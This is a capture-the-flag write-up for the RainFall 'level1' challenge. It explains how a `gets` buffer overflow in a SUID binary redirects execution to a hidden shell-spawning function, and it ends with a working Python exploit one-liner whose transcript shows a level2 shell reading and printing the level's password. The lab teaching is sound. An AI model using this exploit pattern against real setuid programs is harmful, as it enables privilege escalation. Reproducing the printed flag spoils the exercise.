# Level1

## Analysis

[stack-smashing-attack](https://eric-lo.gitbook.io/stack-smashing-attack/asm)

We noticed that the `main` function was simple and used `gets`. By decompiling the binary using `gdb`, we found a "secret" function named `run` that creates a shell (`info functions`). This is significant because the binary is executed with SUID rights, so if we manage to execute this function, it will open a shell with `level2` privileges.

We investigated ways to execute this function. After extensive research, we discovered an attack named "stack smashing attack" that can be exploited using the `gets` function. Interesting, right?

We created a Python script to fill the buffer and write an address at the end (the address of the `run` function). The impact of doing this is to jump to the `run` function after the buffer overflow. Now, we get a shell with `level2` privileges.

## Exploitation

`cat` is important here to keep the stdin opened.

```bash
level1@RainFall:~$ (python -c "import struct; print('A' * 76 + struct.pack('I', 0x8048444))";cat) | ./level1
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
^C
Segmentation fault (core dumped)
level1@RainFall:~$
```
